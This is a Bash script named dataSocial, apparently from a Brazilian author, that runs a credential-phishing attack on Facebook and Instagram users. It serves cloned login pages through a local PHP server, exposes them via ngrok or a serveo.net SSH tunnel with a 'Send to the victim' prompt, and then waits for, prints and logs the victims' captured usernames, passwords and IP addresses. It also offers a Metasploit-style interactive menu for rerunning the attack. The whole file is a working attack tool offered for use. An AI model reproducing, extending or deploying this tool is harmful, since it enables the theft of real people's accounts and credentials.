#!/usr/bin/env bash
# dataSocial - Pesca dados de redes sociais através de páginas sociais modificadas usando a técnica phishing de engenharia social
#
# Site		: https://programadorboard.epizy.com/autor
# Autor		: Oliver Silva <programadorboard@gmail.com>
# Manutênção 	: Oliver Silva <programadorboard@gmail.com>
#
# -------------------------------
# Este programa captura dados de redes sociais através de páginas sociais modificadas utilizando a técnica phishing de engenharia social.
#
# Exemplo:
#
# $ ./dataSocial -s facebook -l -t ngrok
#
# [+] Dados para enviar a vítima:
# [+] Localhost: localhost:5555
# [+] Ngrok localhost: http://localhost:5555
# [+] Ngrok URL: https://00c8-191-96-225-179.sa.ngrok.io
# [-] Nova conexão aberta: 127.0.0.1
# [-] Credenciais capturadas:
# [+] Seu log está em logs/dataSocial.txt
# [-] Usuário: example@server.com
# [-] Senha: teste
# [?] Digite 'ctr+C' OU 'quit' para cancelar OU 'rerun' para realizar novamente este ataque
# quit
#
# [×] Programa interrompido
#
# Histórico:
#
# v0.1 2022-11-28, Oliver Silva;
#     Adicionado suporte para facebook e instagram
# v0.2 2023-01-05, Oliver Silva:
#     Adicionado o comando JQ no lugar do GREP
# v0.3 2023-01-07, Oliver Silva:
#     Adicionado instalador de requisitos caso necessário
# v0.4 2023-01-08, Oliver Silva:
#     Adicionado o loop while no lugar da recursão infinita evitando o bug 'Segmentation fault'
# v0.5 2023-03-19, Oliver Silva:
#     Adicionado suporte a repetição do ataque
# v0.6 2023-03-31, Oliver Silva:
#     Adicionado suporte ao modo interativo
# v0.7 2023-04-27, Oliver Silva:
#     Adicionado algumas regras no prompt bloqueando algumas teclas de atalhos
#
# Licença: MIT License
#
# Versão 0.1: Gera páginas somente facebook e instagram
# Versão 0.2: Troca do GREP pelo JQ pra formatação dos dados
# Versão 0.3: Instalador de requisitos
# Versão 0.4: Bug 'Segmentation fault' resolvido o qual foi causado pela recursão infinita
# Versão 0.5: Repetição do ataque caso precise
# Versão 0.6: Modo interativo adicionado
# Versão 0.7: Tratamento do prompt, bloqueio das teclas de atalho
#

trap interruptTwo SIGINT SIGTSTP

host="localhost"
port="5555"

args=$@

serviceKey=0
listenKey=0
tunnelKey=0

services=("facebook" "instagram" "google")
tunnels=("ngrok" "ssh")

verifyLinks() {
    if [ "$1" == "null" -a "$2" == "null" ] ; then
	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mNull Ngrok links, run this program in another proot shell type or run this program again\e[0m"
    fi
}

interrupt() {
    echo -e "\n\e[32m[\e[33;1m×\e[32m] \e[31;1mInterrupted program\e[0m"
    processKill
    removeFiles
    stty -echoctl
}

interruptTwo() {
    interrupt
    exit 1
}

listen() {
    if  [ -n "$tunnel" -a "$tunnel" == "ngrok" ] ; then
	functionGroup

    else
	functionGroup

    fi
}

functionGroup() {
    removeFiles
    copyFiles
    processKill
    installReqIfNotExists
    listenLocalhost

    echo -e "\e[0m[!] Send to the victim:\e[0m"
    showLink
}

listenLocalhost() {
    php -S ${host}:${port} -t ./www > /dev/null 2>&1 &
    sleep 3
}

removeFiles() {
    [ -d ./www ] && rm ./www -rf
}

copyFiles() {
    [ ! -d ./www ] && mkdir ./www

    if [ -d websites/${service} ] ; then
	cp -rf websites/${service}/* ./www

    else
	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis service is not available\e[0m"
	exit 1
    fi
}

tunnel() {
    if [ "$tunnel" == "ngrok" ] ; then
        ngrok http $port --log=stdout > /dev/null 2>&1 &
        sleep 3
        showLinkNgrok

    elif [ "$tunnel" == "ssh" ] ; then
	ssh -tt -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R $service:$port:$host:$port serveo.net > /dev/null 3>&2 &
	sleep 3
	showLinkSSH

    else
	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis tunnel is not available\e[0m"
	exit 1
    fi
}


processKill() {
    [ $(ps -e | grep -Eo "php") ] && pkill php
    [ $(ps -e | grep -Eo "ngrok") ] && pkill ngrok
    [ $(ps -e | grep -Eo "ssh") ] && pkill ssh
}

showLink() {
   echo -e "\e[0m[!] Localhost: \e[33;1m$host:$port\e[0m"
}

showLinkNgrok() {
    addr=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].config.addr")
    public=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].public_url")

    verifyLinks $addr $public

    echo -e "\e[0m[!] Ngrok localhost: \e[33;1m$addr\e[0m"
    echo -e "\e[0m[!] Ngrok URL: \e[33;1m$public\e[0m"

}

showLinkSSH() {
    ssh="$(ps -e | grep -Eo ssh)"

    if [ -n "$ssh" ] ; then
	echo -e "\e[0m[!] SSH serveo: \e[33;1mserveo.net:$port\e[0m"

    else
	echo -e "\e[0m[!] SSH serveo error\e[0m"
	
    fi
}

getDataCaptured() {
    get_ip
    get_data

    control
}

control() {
    echo -e "\e[0mType 'ctr+C' OR 'quit' to cancel OR 'rerun' to rerun this attack\e[0m" ; read

    if [ "$REPLY" == "rerun" ] ; then
	rerun

    elif [ "$REPLY" == "quit" ] ; then
        interruptTwo

    else
	control
    fi
}

get_ip() {
    while [ ! -f ./www/ip.txt ] ; do
	printf "\r\e[0m[-] Listening connection...\e[0m"
    done

    ip=$(cat ./www/ip.txt | grep -Eo ":.*" | tr -d \ :)
    printf "\r\e[0m[+] New open connection: \e[33;1m$ip\e[0m\n"

}

get_data() {
    while [ ! -f ./www/src/dados.txt ] ; do 
	printf "\r\e[0m[-] Waiting for credentials...\e[0m"
    done

    [ ! -d ./logs ] && mkdir logs

    cat ./www/src/dados.txt > ./logs/dataSocial.txt
    printf "\r\e[0m[-] Captured credentials:     \e[0m\n"
    printf "\r\e[0m[+] Your log is in \e[32mlogs/dataSocial.txt\e[0m\n"

    usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
    senha=$(cat ./www/src/dados.txt | grep -Eo "Senha:.*" | grep -Eo ":.*" | tr -d \ :)

    echo -e "\e[0m[+] Username: \e[32m$usuario\e[0m"
    echo -e "\e[0m[+] Password: \e[32m$senha\e[0m"
}

banner() {
echo -e "\e[34m
	        '  
              '   '  TIOOLIVER | t.me/tiooliver_sh
            '       '   youtube.com/@tioolive - BRAZIL
        . ' .    '    '                       '
     ' 		    '	                   '   '
  █▀▄ ▄▀█ ▀█▀ ▄▀█   █▀ █▀█ █▀▀ █ ▄▀█ █░░
  █▄▀ █▀█ ░█░ █▀█   ▄█ █▄█ █▄▄ █ █▀█ █▄▄ 
  .			     ..'.    ' .
    '  .    		   .     '       '
          ' .  .  .  .  . '.    .'         '  '
	     '         '    '. '              .
	       '       '      '
	         ' .  '   Site: programadorboard.epizy.com 
\e[0m"
}

helper() {
    echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tShow  this help screen and exit\n\t-v, --version\tShows the current version of the program\n\t-S, --services\tShow all services\n\t-T, --tunnels\tShow all tunnels\n\t-s, --service\tUse a service\n\t-l, --listen\tEnable listenning on localhost\n\t-t, --tunnel\tDefines a tunnel\n\t-i, \n\t--interactive\tStart the program in interactive mode\n\nExamples:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
    exit 0
}

version() {
    echo -ne "$(basename "$0")"
    grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr A-Z a-z
}

# Percorre a uma lista
list() {
    array="$1"
    count=1
    echo "All"
    for index in $array ; do
	echo -e "\e[0m$count => \e[0m\e[32;2m$index\e[0m"
	count=$((count +1))
    done
}

# Checa pacotes necessários
checkReq() {
    listReq=("ssh" "tar" "php" "jq" "curl" "toilet" "figlet")

    [ -d $PREFIX/bin ] && dir=$PREFIX/bin # Termux
    [ -d /usr/bin ] && dir=/usr/bin 	  # Proot, Chroot or others

    for package in ${listReq[*]} ; do
	if [ "$package" == "openssh" ] ; then
	    package="ssh"

	fi

	if [ ! -f $dir/$package ] ; then
	    echo -e "\e[0mPackage required not found => \e[0m\e[33;2m$package\e[0m"
	    echo -e "\e[0mTry run => \e[0m\e[32;2mbash ./install.sh\e[0m"
	    exit 1
	fi
    done
}

installReqIfNotExists() {
    [ -d /usr/bin ] && dir=/usr/bin
    [ -d $PREFIX/bin ] && dir=$PREFIX/bin 

    case "$(dpkg --print-architecture)" in
	aarch64)
	    arch="arm64";;
        armhf | arm)
	    arch="arm";;
	amd64)
	    arch="amd64";;
	x86_84)
	    arch="amd64";;
	i*86)
	    arch="i386";;
	i386)
	    arch="i386";;
    *)
	echo "[!] Invalid architecture"
	exit 1
    esac

    link="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz"

    if [ ! -f ${dir}/ngrok ] ; then
	printf "\r\e[33;1m[*] Installing Ngrok...\e[0m"
	curl -LO $link > /dev/null 2>&1 &

	while [ -n "$(ps -e | grep -Eo 'curl')" ] ; do
	    printf "\r\e[33;1m[*] Installing Ngrok..."
	
    	done
	printf "\r\e[33;1m[+] Installing Ngrok...\e[32;1mOK\e[0m\n"
	while [ ! -f ${dir}/ngrok ] ; do
	    printf "\r\e[33;1m[*] Extracting Ngrok...\e[0m"
	    tar -xvzf ngrok-v3-stable-linux-${arch}.tgz -C $dir > /dev/null
	done
	printf "\r\e[33;1m[+] Extracting Ngrok...\e[32;1mOK\e[0m\n"
	rm ngrok-v3-stable-linux-${arch}.tgz
    fi
}

rerun() {
    echo -e "\e[0mRun that attack again? [y/n] : \e[0m" ; read

    if [ -z "$REPLY" ] ; then
	rerun

    elif [ -n "$REPLY" -a "$REPLY" == "y" -o "$REPLY" == "Y" ] ; then
	interrupt > /dev/null && ./dataSocial.sh $args

    elif [ -n "$REPLY" -a "$REPLY" == "n" -o "$REPLY" == "N" ] ; then
	interrupt

    else
	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mInvalid answer, try '\e[33;1my\e[31;1m' or '\e[33;1mn\e[31;1m'\e[0m\n"
	rerun
    fi
}

# Modo interativo
usage_i() {
    echo -e "\n\n\t\e[0mCommand\t\tDescription\n\t-------\t\t-----------\n\t?\t\tHelp menu\n\tquit\t\tStop this program\n\tshow <?>\tIt shows services, tunnels, default options. Replace <?> with one of these 3 commands\n\tuse <?>\t\tUse services and etc. Replace <?> with one of these commands\n\tset <?>\t\tDefine tunnels and etc. Replace <?> with one of these commands\n\trun\t\trun the setup\n\n"
}

options_i() {
    echo -e "\n\e[0mModule options (service/${service:-No service}):\n\n\tName\tCurrent Setting\tRequire\tDescription\n\t----\t---------------\t-------\t-----------\n\tTunnel\t[${tunnel:-No tunnel}]\t\tno\tAllow the tunnel\n\n"
}

menu() {

    count=0
    commands=()

    scape=$(printf '\u1b')
    cmd="\e[0m\e[31;1mDs\e[36;3m>\e[0m\e[34m"

    while [[ true ]] ; do

	echo -ne "\r$cmd $comm"

	IFS= read -rsn1 mode

	if [[ $mode == $scape ]] ; then
	    IFS= read -rsn2 mode

	    case $mode in
		"[A")
		    if [[ ${#commands[*]} -ge 1 ]] ; then
	
			index=$[ $count -1 ]
			comm=${commands[$index]}
		    fi
		    ;;
		"[B")
			unset comm
			printf "\r                                                 "
		    ;;
		*)
            esac

	elif [[ $mode == $'\x7f' ]] ; then
	    if [[ -n $comm ]] ; then

		comm=${comm%?}
		printf "\b \b"
		
	    fi
     
        elif [[ $mode == $'\0A' ]] ; then
	    if [[ -n "$comm" ]] ; then

		# quit, exit
		if [[ "$comm" == "quit" ]] || 
		   [[ "$comm" == "QUIT" ]] || 
		   [[ "$comm" == "exit" ]] || 
		   [[ "$comm" == "EXIT" ]] ; then
		
		    interrupt && exit 0

		# help, ?
		elif [[ "$comm" == "help" ]] || 
		     [[ "$comm" == "HELP" ]] || 
		     [[ "$comm" == "?" ]] ; then
	      	    commands[$count]=$comm
		    usage_i

		# show
		elif [[ "${comm:0:4}" == "show" ]] ; then
		    commands[$count]=$comm
		    if [[ -n "${comm:5}" ]] ; then

			if [[ "${comm:5:8}" == "services" ]] ; then
			    commands[$count]=$comm
		
      	    	            list "${services[*]}"

			elif [[ "${comm:5:7}" == "tunnels" ]] ; then
			    commands[$count]=$comm

			    list "${tunnels[*]}"

			elif [[ "${comm:5:7}" == "options" ]] ; then
			    commands[$count]=$comm

			    options_i

			else

			    echo -e "\n\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"

			fi

		    else
			echo -e "\n\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"

		    fi

		# use
		elif [[ "${comm:0:3}" == "use" ]] ; then

		    commands[$count]=$comm

		    if [[ -n "${comm:4}" ]] ; then

		        if [[ "${comm:4:7}" == "service" ]] ; then
			    commands[$count]=$comm

			    if [[ -n "${comm:12}" ]] ; then
				 
				case "${comm:12}" in
				    "facebook")

					commands[$count]=$comm
					service="${comm:12}"
					echo -e "\n\e[0m\e[31;1mService => $service\e[0m";;

				    "instagram")

					commands[$count]=$comm
					service="${comm:12}"
					echo -e "\n\e[0m\e[31;1mService => $service\e[0m";;

				    *)
					echo -e "\n\e[0m\e[33;1mCommands = show services - ?\e[0m";;
			        esac

		            else
				echo -e "\n\e[0m\e[33;1mCommands = facebook - instagram - ?\e[0m"

			    fi

			else
			    echo -e "\n\e[0m\e[33;1mCommands = service - ?\e[0m"

		        fi

		    else
			echo -e "\n\e[0m\e[33;1mCommands = service - ?\e[0m"

		    fi

		# set
		elif [[ "${comm:0:3}" == "set" ]] ; then

		    commands[$count]=$comm

		    if [[ "${comm:4:6}" == "tunnel" ]] ; then
			
			if [[ -n "${comm:11}" ]] ; then

			    case "${comm:11}" in
				"ngrok")

				    commands[$count]=$comm

				    if [[ -n "$service" ]] ; then
			                tunnel=${comm:11}
				        echo -e "\n\e[0m\e[31;1mTunnel => $tunnel\e[0m"
				    else
					echo -e "\n\e[0m\e[33;1m[!] Select a service before defining the tunnel\e[0m"
				    fi
				    ;;

				"ssh")

				    commands[$count]=$comm

				    if [[ -n "$service" ]] ; then
				        tunnel=${comm:11}
				        echo -e "\n\e[0m\e[31;1mTunnel => $tunnel\e[0m"
				    else
					echo -e "\n\e[0m\e[33;1m[!] Select a service before defining the tunnel\e[0m"
				    fi
				    ;;

				*)
				    echo -e "\n\e[0m\e[33;1m[!] invalid tunnel\e[0m";;

	    		    esac

			else
			    echo -e "\n\e[0m\e[33;1mCommands = ngrok - ssh - show tunnels - ?\e[0m"
			
			fi

		    else
			echo -e "\n\e[0m\e[33;1mCommands = tunnel - help\e[0m"

		    fi

		# run, execute, exploit
		elif [[ "${comm:0:3}" == "run" ]] || 
		     [[ "${comm:0:7}" == "execute" ]] || 
		     [[ "${comm:0:7}" == "exploit" ]] ; then
		    commands[$count]=$comm

		    if [[ -n "$service" ]] && 
		       [[ -z "$tunnel" ]] then
			echo -e "\n\e[0mRunning the setup locally\e[0m..."
			args="--listen --service $service"
			listen && getDataCaptured

		    elif [[ -n "$service" ]] && 
			[[ -n "$tunnel" ]] ; then
			echo -e "\n\e[0mRunning the configuration with tunnel\e[0m..."
			args="--listen --service $service --tunnel $tunnel"
			listen && tunnel && getDataCaptured

		    else
			echo -e "\n\e[0m\e[33;1m[!] No settings defined\e[0m"

		    fi

		else
		    echo -e "\n\e[0m\e[33;1mCommands = ? - help\e[0m"
		fi

		unset comm
		count=$[ $count +1 ]

	    else
		echo -e "\n\e[0m\e[33;1mError, try? or help for more help!\e[0m"
	
	    fi

        else
	    comm+=$mode 
	fi
    done
    interrupt
    exit 0
}

banner_two() {

    version=$(grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr -d " a-zãV")
    dateUpdate=$(grep "^# v.*" dataSocial.sh | cut -d , -f 1 | tr -d \# | tr -d "a-z." | cut -c5-15 | tail -1)

    echo -e "\n\n"
    toilet -f slant dataSocial --metal
    echo -e "\t\t--=[DataSocial Phishing\n\t+---**---==[Version :\e[31m$version\e[0m\n\t+---**---==[Codename :\e[31mLiving is not for the weak\e[0m\n\t+---**---==[Services : \e[32;2m2\e[0m\n\t\t--=[Update Date : [\e[31m$dateUpdate\e[0m]"
    echo -e "\n\n"
}

interactiveMode() {
    banner_two
    menu
}

if [ -z "$1" ] ; then
    banner
    echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mError, try -h,--help for more help\e[0m"
    exit 0
fi


while [ -n "$1" ] ; do
    case "$1" in
	-h | --help)
	    helper;;
	-v | --version)
	    version && exit 0;;
	-S | --services)
	    list "${services[*]}" && exit 0;;
	-T | --tunnels)
	    list "${tunnels[*]}" && exit 0;;
	-s | --service)
	    shift

	    if [ -z "$1" ] ; then
		echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mSpecify the service\e[0m"
		exit 1
	    fi

	    serviceKey=1
	    service="$1";;

	-l | --listen)
	    listenKey=1;;
	-t | --tunnel)
	    shift

	    if [ -z "$1" ] ; then
		echo -e "\e[0m[\e[31;1m!\e[0m] Specify the tunnel\e[0m"
		exit 1
	    fi

	    tunnelKey=1
	    tunnel="$1"
	    ;;
        -i | --interactive)
	    checkReq
	    interactiveMode;;

	*)
	    echo -e "\e[0m[\e[31;1m!\e[0m] Invalid option: $1\e[0m" && exit 1;;
    esac
    shift
done

if [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 0 ] ; then
    checkReq && banner && listen && getDataCaptured

elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 1 ] ; then
    checkReq && banner && listen && tunnel && getDataCaptured

else
    checkReq
    echo -e "\e[0m[\e[31;1m!\e[0m] \e[0mError processing command, try: -h,--help for more details\e[0m"
    exit 1
fi
